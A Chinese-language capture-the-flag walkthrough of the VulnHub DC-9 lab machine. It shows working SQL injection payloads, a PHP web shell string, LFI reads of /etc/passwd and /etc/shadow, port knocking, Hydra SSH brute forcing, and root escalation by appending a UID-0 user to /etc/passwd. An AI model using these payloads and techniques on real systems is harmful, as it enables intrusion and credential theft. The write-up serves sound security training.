# DC: 9

2024-5-28 https://www.vulnhub.com/entry/dc-9,412/

difficulty: Beginner

## IP

192.168.5.30

## Scan

Open Port -> 22,80

```
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)
```

直接看 80 web，页面上有几个菜单按钮，其中有一个 search，经过测试，存在 sql 注入：

```
http://192.168.5.30/search.php

Julie' or sleep(3) -- -
```

会停顿 3 秒钟。

使用 sqlmap 直接上：

```
Parameter: search (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=Julie' AND 3358=3358 AND 'liYU'='liYU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=Julie' AND (SELECT 3752 FROM (SELECT(SLEEP(5)))HnqJ) AND 'tVdP'='tVdP

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=Julie' UNION ALL SELECT CONCAT(0x7176627171,0x484e5457644872636455476f6b6871774a4374627066514f617a6e5978475250416c576f425a486d,0x7171717a71),NULL,NULL,NULL,NULL,NULL-- -
```

找到系统登陆的用户名和密码：

```
sqlmap -r req1.txt --batch -D users -T UserDetails --dump

+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+

```

```
sqlmap -r req1.txt --batch -D Staff -T StaffDetails --dump

+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| id | email                 | phone          | lastname   | reg_date            | firstname | position                      |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| 1  | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           |
| 2  | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               |
| 3  | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         |
| 4  | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |
| 5  | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        |
| 6  | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        |
| 7  | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      |
| 8  | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               |
| 9  | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             |
| 10 | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       |
| 11 | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            |
| 12 | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    |
| 13 | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     |
| 14 | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             |
| 15 | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  |
| 16 | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           |
| 17 | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+

```

```

sqlmap -r req1.txt --batch -D Staff -T Users --dump

| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
```

找到了 admin 对应的明文密码 transorbital1

登录成功后，看到页面上有一个添加的功能 http://192.168.5.30/addrecord.php，结合前面有一个列表显示功能 http://192.168.5.30/display.php，可以将web shell 通过 add 功能写入到数据库，然后在 display 时，把 web shell 带到页面中，并且能够执行。

进行尝试：

```
user name 输入 2<?php system($_GET[1]);?>2
```

但是显示时还是没有把写入的 php 执行，php 代码只是隐藏在 html 中，没有执行，估计是数据库执行时 php 已经解析了，所有动态添加的不能执行。

http://192.168.5.30/manage.php 看到这个页面的底部显示了一个 File does not exist，好像是 url 中缺少了参数，导致这个页面在加载时，没有找到文件加载，尝试带入 file 参数进行访问：

```
http://192.168.5.30/manage.php?file=../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
...
marym:x:1001:1001:Mary Moe:/home/marym:/bin/bash
julied:x:1002:1002:Julie Dooley:/home/julied:/bin/bash
fredf:x:1003:1003:Fred Flintstone:/home/fredf:/bin/bash
barneyr:x:1004:1004:Barney Rubble:/home/barneyr:/bin/bash
tomc:x:1005:1005:Tom Cat:/home/tomc:/bin/bash
jerrym:x:1006:1006:Jerry Mouse:/home/jerrym:/bin/bash
wilmaf:x:1007:1007:Wilma Flintstone:/home/wilmaf:/bin/bash
bettyr:x:1008:1008:Betty Rubble:/home/bettyr:/bin/bash
chandlerb:x:1009:1009:Chandler Bing:/home/chandlerb:/bin/bash
joeyt:x:1010:1010:Joey Tribbiani:/home/joeyt:/bin/bash
rachelg:x:1011:1011:Rachel Green:/home/rachelg:/bin/bash
rossg:x:1012:1012:Ross Geller:/home/rossg:/bin/bash
monicag:x:1013:1013:Monica Geller:/home/monicag:/bin/bash
phoebeb:x:1014:1014:Phoebe Buffay:/home/phoebeb:/bin/bash
scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash
janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
```

这样就可以用 LFI 实现 web rce，先 FUZZ 看看能读取到系统哪些文件,但是记住要加上 cookie 否则扫不出来：

```
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.5.30/manage.php?file=../../../../../../../..FUZZ -b 'PHPSESSID=5usb7p4sj2miadkjeq82oqgq8s' -fs 1341
```

没有发现能加载的 web log 或者 ssh auth log，在看看其他配置文件，上面那个 ssh 端口是 filter 的，有没有可能是 knock，常见的套路，尝试访问配置文件：

```
http://192.168.5.30/manage.php?file=../../../../../../../etc/knockd.conf

[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn
```

需要顺序敲击 7469,8475,9842 这三个端口，才能开放 22 端口：

```
knock 192.168.5.30 7469 8475 9842
```

这时发现 ssh 22 端口已经开放。

在前面 dump 数据库的数据时，已经获得了 17 个账号名和密码，结合 LFI 时读取的 /etc/passwd 发现也是 17 个账号，可能这里面就有能够登陆的账号和密码，整理出用户名和密码，使用 hydra 登陆爆破：

```
hydra -t 20 -L user -P pass.txt  ssh://192.168.5.30

[22][ssh] host: 192.168.5.30   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.5.30   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.5.30   login: janitor   password: Ilovepeepee
```

发现 3 个可以登陆的 ssh 账号。

挨个登陆这个三个账号，发现都没有 sudo、suid 等特殊的程序。

但是在 janitor 的 home 目录中，发现了一个隐藏文件夹 .secrets-for-putin ：

```
janitor@dc-9:~$ cd .secrets-for-putin/
janitor@dc-9:~/.secrets-for-putin$ ls -al
total 12
drwx------ 2 janitor janitor 4096 Dec 29  2019 .
drwx------ 4 janitor janitor 4096 May 28 12:22 ..
-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

发现了一个密码字典列表，再次使用这个密码字典对前面发现的 17 个用户爆破，看看能不能发现新用户，发现

```
[22][ssh] host: 192.168.5.30   login: fredf   password: B4-Tru3-001
```

登陆这个账号，看看有什么信息，sudo -l 发现：

```
(root) NOPASSWD: /opt/devstuff/dist/test/test
```

/opt/devstuff/dist/test/test 对 fredf 用户没有可写权限，不能覆盖，用 strings 查看下文件内容，看看有什么可利用的点，没有发现相对路径的调用，直接执行看看什么内容：

```
fredf@dc-9:/tmp$ sudo -u root /opt/devstuff/dist/test/test
Usage: python test.py read append
```

好像有一个 test.py 文件，看看在哪里：

```
fredf@dc-9:/tmp$ find / -name test.py 2>/dev/null
/opt/devstuff/test.py
/usr/lib/python3/dist-packages/setuptools/command/test.py
```

```
fredf@dc-9:/tmp$ ls -al /opt/devstuff/test.py
-rw-r--r-- 1 root root 250 Dec 29  2019 /opt/devstuff/test.py
fredf@dc-9:/tmp$ cat /opt/devstuff/test.py
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

需要 3 个输入参数，1 参数对应读取，2 参数可以追加。

进行测试，读取 /etc/passwd :

```
sudo -u root /opt/devstuff/dist/test/test '/etc/passwd' /tmp/1.txt
```

发现 /tmp/1.txt 中已经读取了 passwd 的内容，那么就可以继续读取 /etc/shadow 的内容，获取更多哈希：`

```
sudo -u root /opt/devstuff/dist/test/test '/etc/shadow' /tmp/shadow

root:$6$lFbb8QQt2wX7eUeE$6NC9LUG7cFwjIPZraeiOCkMqsJ4/4pndIOaio.f2f0Lsmy2G91EyxJrEZvZYjmXRfJK/jOiKK0iTGRyUrtl2R0:18259:0:99999:7:::
marym:$6$EC59.EO3fZXPPMVr$61TZ96DmGiYpTCyB02YdIl0Uvu82UnFMSxlZ5HcraYN.5sgJI/E028bxjZM5S2LwwN8LImSUxfz9fXckKfRdJ0:18259:0:99999:7:::
julied:$6$32/2fdkDb73B.Pbu$ZY/FnFR9GHSLfdhOmqYc6Qrt0MrwllJ3VjZDoyc8386oYyuYRUIPDvz3GOp36KzlnzfKObcQKbA44OFRWVaTH/:18259:0:99999:7:::
fredf:$6$CLKIMQJIUehJJqbo$8afEl6ipZRF1LKIu8Qw9wbufGgFze6/xrBDdTr7oS6bTibipCenHJ/m/lzNj36i8pIfrsd2RVoEdA5jwxhnMZ1:18259:0:99999:7:::
barneyr:$6$ozASzz3uY5pZ01N0$mXJ2Bh9t5vgmMpnTl6CXtvCRz5zYBr4bwYLE/0JtxPHAeFmlxJibsgQsJRemYYPbzVuFRIu9KD9CD3MFl5CJ6/:18259:0:99999:7:::
tomc:$6$96XehDk5ozd3Yx1N$ZmrnsxS6rH1KpyMN4E0YhRPKfcP/ZacdFl7eHgTVJhFwqfxgaDGH7aLYTONEi2XjXWV.TvbGL7nU3ihiHf30Y0:18259:0:99999:7:::
jerrym:$6$wlCURlxOqBWhare6$zq3RvAT4tdx12GoMP0BLK/TxLausSspKPCHWIQSuBVMXm8GN5Wi13FsIkvLpML93Ny8G6J/q3JEr41Pder6Q/.:18259:0:99999:7:::
wilmaf:$6$2hEqLZyozDA001uz$LFM49N1ZO1bN1KbMuzb9jJCIonwEPNBxEvEFmIXPgAL1KvKAxgJFH494CWHUyzsizvCz780z6r1OeufCgxHUm0:18259:0:99999:7:::
bettyr:$6$cZjlc4EB3VXiOGoY$fcW9ne5x2wQhYdnUukOcx0umnG/FSzuIGLZTRPo/VlPDWai/oM5FVaffLqSSim5xgwJ3JBerIdW6BXZWTc6gd.:18259:0:99999:7:::
chandlerb:$6$cVQ1y2nQYgwpMKvT$3rRdWV/3d0uasARPBvZlcAtrWQZdjJsndgSIfD27yf0jGTp6hxgXrI0v5CayLtuallgbCg44gLjnbCN8NlFHk0:18259:0:99999:7:::
joeyt:$6$FfsFOF2eFLLssCIx$Xw2h6l2tkSye/9IoYbK0a6VeGd8771UJWyeYw1m2X6Xcgc1iE0UYaZf.ySUlD8tIsS6FRxyAxEZyYspbAdvIf/:18259:0:99999:7:::
rachelg:$6$yDoxHglucM5kjbyz$JL0k6riILYc2fDVu.S25TrVAWDXB5yjtdrhHtQkCp25oZnMTGq6dj8LJX8yGutyeNDd8mjyQT8UDtN9C6CKvA.:18259:0:99999:7:::
rossg:$6$m7qudrh2e.QzNHjz$W/qreraYyvBJICSt12Oha2pqvjRpPcyU1nhMpHKhHTZ/X3sRE7nvkVtHh0oYrKgjYyznWn6XtDShoN6tRmeYh1:18259:0:99999:7:::
monicag:$6$OKThUPaRpzMonEJT$VJOMjAKPip3c6MSteIsrtu/x01VwvK6CfUYmY24RU5X.jYBJYbGzCQPFBpfzXc32D2jItQL2eTYtTxrrXh9pT.:18259:0:99999:7:::
phoebeb:$6$hv8tIcEfkNLWF0UD$JNOVj9XT0kOh/omUlPOzL8kbkNyqmcGSRuAwK97kHYEfzvP4MJnWiGTIbGuYW5wCGOzsJ2MN8e5fO5jh6f3GX/:18259:0:99999:7:::
scoots:$6$PxiTl9DHLbYR.R9b$K6judJrN68gASxg9mOLsL./YVhs4Gt/QTtI1Qx5Wj2Fc2QpgmDZtMhfwxNMs2nUSywOdRaPobhtvb2QT.24OK.:18259:0:99999:7:::
janitor:$6$bQhC0fZ9g9313Aat$aZ0GecSMTi1qUGqSF6eAdGu2pDXRg1Zu8JzLyyhvSAwh8MnLzv3XPnu6Vw9OruPsgAGgA2dCYdOuk9T4hgDZ6/:18259:0:99999:7:::
janitor2:$6$HkvFAeOwjGjr6jDj$CUt0HJpmATAcPYxVjsxsYclUWFgfaGucL.c/WiavCt.op9UjqkM2yZdoDpyFW1rZbiSHCQ2MGIy0kBhcPPnhn.:18259:0:99999:7:::
```

得到哈希，尝试进行爆破，找到明文密码，但是都没爆破出来。

这个 sudo 程序出了可以读取，还可以写入，我们可以将一个新的 root 用户添加到 /etc/passwd 中，然后覆盖这个文件：

```
cp /etc/passwd /tmp/passwd

openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

echo 'tom:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:User_like_root:/root:/bin/bash' >> /tmp/passwd

sudo -u root /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd

cat /etc/passwd
```

可以看到一个新用户已经成功写入到 /etc/passwd 中，su tom 输入密码 123 成功获得 root 权限：

```
root@dc-9:~# cat theflag.txt


███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝

Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.
```
